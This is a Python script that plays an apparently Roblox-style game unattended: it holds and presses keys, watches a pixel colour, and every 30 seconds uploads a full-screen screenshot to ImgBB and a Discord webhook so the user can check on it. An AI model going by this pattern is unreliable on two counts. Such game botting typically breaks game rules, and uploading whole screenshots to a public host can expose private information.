# ImgBB API Key (replace with your own key)
IMGBB_API_KEY = "" #https://api.imgbb.com/
DISCORDWEBHOOK = "" #A discordwebhook
# used for monitoring your screen while afk


# code below, edit if needed
print("This program lets you grind edge moggers while AFK")
print("Make sure auto hatch is on for hatching")
print("Loading")
import pydirectinput
import time
import threading
import pyautogui
import keyboard
import requests
from io import BytesIO
from PIL import Image
import base64
print("Loaded")

def holdE():  # Auto Ledge
    print("E is being held down")
    while True:
        pydirectinput.keyDown('e')
        time.sleep(5)
        pydirectinput.keyUp('e')


threading.Thread(target=holdE).start()

print("Please press the 'L' key when the mouse is below the ledge limit")
keyboard.wait('L')
current_x, current_y = pyautogui.position()


def is_pixel_color(x, y, expected_color):
    pixel_color = pyautogui.pixel(x, y)
    return pixel_color == expected_color


def autoedge():  # Auto Edge Thing (OP)
    print("Edgeing Started")
    while True:
        pydirectinput.press('x')
        expected_color = (20, 36, 194)
        timeout = 10
        start_time = time.time()
        while not is_pixel_color(current_x, current_y, expected_color):
            if time.time() - start_time > timeout:
                print("Timeout reached. Edge never reached")
                break
        pydirectinput.press('x')
        print("Edged!")
        time.sleep(1)


threading.Thread(target=autoedge).start()


def take_screenshot():
    screenshot = pyautogui.screenshot()
    return screenshot


def upload_to_imgbb(api_key, image):
    url = "https://api.imgbb.com/1/upload"
    image_base64 = base64.b64encode(image.getvalue()).decode('utf-8')
    payload = {
        "key": api_key,
        "image": image_base64
    }
    response = requests.post(url, payload)
    data = response.json()
    if response.status_code == 200 and data['data']['url']:
        print("Image uploaded to ImgBB successfully.")
        return data['data']['url']
    else:
        print(f"Failed to upload image to ImgBB. Status code: {response.status_code}")
        return None


def reportscreen(screenshot, discord_webhook, imgbb_api_key):
    image_byte_array = BytesIO()
    screenshot.save(image_byte_array, format='PNG')
    image_url = upload_to_imgbb(imgbb_api_key, image_byte_array)

    if image_url:
        payload = {"content": "Screenshot", "embeds": [{"image": {"url": image_url}}]}
        response = requests.post(discord_webhook, json=payload)

        if response.status_code == 200:
            print("Screenshot sent successfully to Discord webhook.")
        else:
            print(f"Failed to send screenshot. Status code: {response.status_code}")


while True:
    try:
        start_time = time.time()
        screenshot = take_screenshot()
        reportscreen(screenshot, DISCORDWEBHOOK, IMGBB_API_KEY)
        elapsed_time = time.time() - start_time
        print(f"Report sent in {elapsed_time} seconds.")
    except Exception as e:
        print(f"Error: {e}")

    time.sleep(30) #time to take screenshots
